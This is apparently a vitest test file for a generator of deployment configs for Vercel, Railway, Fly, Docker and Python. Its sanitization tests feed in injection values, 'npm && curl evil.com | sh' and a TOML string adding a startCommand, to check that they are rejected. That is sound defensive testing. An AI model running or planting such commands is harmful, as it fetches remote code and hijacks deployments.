import { describe, expect, it } from "vitest";
import type { DeveloperProfile } from "../../profile/schema.js";
import { DEFAULT_PROFILE } from "../../profile/defaults.js";
import { generateDeploymentDefaults } from "./deployment.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeProfile(overrides: Partial<DeveloperProfile> = {}): DeveloperProfile {
  return { ...DEFAULT_PROFILE, name: "Test Dev", ...overrides };
}

function findFile(files: { filepath: string }[], partial: string) {
  return files.find((f) => f.filepath.includes(partial));
}

// ---------------------------------------------------------------------------
// Vercel
// ---------------------------------------------------------------------------

describe("vercel", () => {
  it("generates vercel.json", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "vercel" }));

    expect(files).toHaveLength(1);
    const vj = findFile(files, "vercel.json");
    expect(vj).toBeDefined();
    expect(vj!.filepath).toBe("vercel.json");
    expect(vj!.content).toContain("buildCommand");
  });
});

// ---------------------------------------------------------------------------
// Railway
// ---------------------------------------------------------------------------

describe("railway", () => {
  it("generates railway.toml", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "railway" }));

    expect(files).toHaveLength(1);
    const rt = findFile(files, "railway.toml");
    expect(rt).toBeDefined();
    expect(rt!.filepath).toBe("railway.toml");
    expect(rt!.content).toContain("[build]");
    expect(rt!.content).toContain("[deploy]");
  });
});

// ---------------------------------------------------------------------------
// Fly
// ---------------------------------------------------------------------------

describe("fly", () => {
  it("generates fly.toml", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "fly" }));

    expect(files).toHaveLength(1);
    const ft = findFile(files, "fly.toml");
    expect(ft).toBeDefined();
    expect(ft!.filepath).toBe("fly.toml");
    expect(ft!.content).toContain("[http_service]");
  });
});

// ---------------------------------------------------------------------------
// Docker
// ---------------------------------------------------------------------------

describe("docker", () => {
  it("generates Dockerfile and .dockerignore", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "docker" }));

    expect(files).toHaveLength(2);

    const df = findFile(files, "Dockerfile");
    expect(df).toBeDefined();
    expect(df!.filepath).toBe("Dockerfile");
    expect(df!.content).toContain("FROM node:22-alpine");

    const di = findFile(files, ".dockerignore");
    expect(di).toBeDefined();
    expect(di!.filepath).toBe(".dockerignore");
    expect(di!.content).toContain("node_modules");
  });
});

// ---------------------------------------------------------------------------
// None / other
// ---------------------------------------------------------------------------

describe("none", () => {
  it("returns empty array", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "none" }));

    expect(files).toEqual([]);
  });
});

describe("unknown provider", () => {
  it("returns empty array for aws", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "aws" }));

    expect(files).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// File paths
// ---------------------------------------------------------------------------

describe("file paths", () => {
  it("are relative (no leading /)", () => {
    const providers = ["vercel", "railway", "fly", "docker"] as const;

    for (const cp of providers) {
      const files = generateDeploymentDefaults(makeProfile({ cloudProvider: cp }));
      for (const file of files) {
        expect(file.filepath).not.toMatch(/^\//);
      }
    }
  });
});

// ---------------------------------------------------------------------------
// Package manager awareness
// ---------------------------------------------------------------------------

describe("package manager variations", () => {
  it("vercel uses npm build/install when packageManager is npm", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "vercel", packageManager: "npm" }),
    );
    const vj = findFile(files, "vercel.json");
    expect(vj).toBeDefined();
    expect(vj!.content).toContain("npm build");
    expect(vj!.content).toContain("npm install");
  });

  it("railway uses yarn start when packageManager is yarn", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "railway", packageManager: "yarn" }),
    );
    const rt = findFile(files, "railway.toml");
    expect(rt).toBeDefined();
    expect(rt!.content).toContain("yarn start");
  });

  it("docker uses npm ci (not npm install --ci) for npm", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "docker", packageManager: "npm" }),
    );
    const df = findFile(files, "Dockerfile");
    expect(df).toBeDefined();
    expect(df!.content).toContain("package-lock.json");
    expect(df!.content).toContain("npm ci");
    expect(df!.content).not.toContain("npm install --ci");
  });

  it("docker uses pnpm-lock.yaml and corepack for pnpm", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "docker", packageManager: "pnpm" }),
    );
    const df = findFile(files, "Dockerfile");
    expect(df).toBeDefined();
    expect(df!.content).toContain("pnpm-lock.yaml");
    expect(df!.content).toContain("corepack enable pnpm");
  });
});

// ---------------------------------------------------------------------------
// Package manager injection defense
// ---------------------------------------------------------------------------

describe("package manager sanitization", () => {
  it("docker falls back to npm for invalid packageManager", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "docker", packageManager: "npm && curl evil.com | sh" as any }),
    );
    const df = findFile(files, "Dockerfile");
    expect(df).toBeDefined();
    expect(df!.content).toContain("npm ci");
    expect(df!.content).not.toContain("curl");
    expect(df!.content).not.toContain("evil");
  });

  it("railway falls back to npm for invalid packageManager", () => {
    const files = generateDeploymentDefaults(
      makeProfile({
        cloudProvider: "railway",
        packageManager: 'pnpm"\n[deploy]\nstartCommand = "evil' as any,
      }),
    );
    const rt = findFile(files, "railway.toml");
    expect(rt).toBeDefined();
    expect(rt!.content).toContain("npm start");
    expect(rt!.content).not.toContain("evil");
  });

  it("vercel falls back to npm for invalid packageManager", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "vercel", packageManager: "malicious-value" as any }),
    );
    const vj = findFile(files, "vercel.json");
    expect(vj).toBeDefined();
    expect(vj!.content).toContain("npm build");
    expect(vj!.content).not.toContain("malicious");
  });
});

// ---------------------------------------------------------------------------
// Python support
// ---------------------------------------------------------------------------

describe("python docker", () => {
  it("generates Python Dockerfile with venv for correct multi-stage build", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "docker", languages: ["python"] }),
    );
    const df = findFile(files, "Dockerfile");
    expect(df).toBeDefined();
    expect(df!.content).toContain("python:3.11-slim");
    expect(df!.content).toContain("requirements.txt");
    expect(df!.content).toContain("python -m venv");
    expect(df!.content).toContain("/app/.venv/bin");
    expect(df!.content).not.toContain("node:");
  });

  it("generates Python .dockerignore with __pycache__ and .venv", () => {
    const files = generateDeploymentDefaults(
      makeProfile({ cloudProvider: "docker", languages: ["python"] }),
    );
    const di = findFile(files, ".dockerignore");
    expect(di).toBeDefined();
    expect(di!.content).toContain("__pycache__");
    expect(di!.content).toContain(".venv");
  });
});

// ---------------------------------------------------------------------------
// Fly.toml app name
// ---------------------------------------------------------------------------

describe("fly.toml", () => {
  it("has commented-out app name (not empty string)", () => {
    const files = generateDeploymentDefaults(makeProfile({ cloudProvider: "fly" }));
    const ft = findFile(files, "fly.toml");
    expect(ft).toBeDefined();
    expect(ft!.content).toContain("# app =");
    expect(ft!.content).not.toMatch(/^app = ""\s*$/m);
  });
});
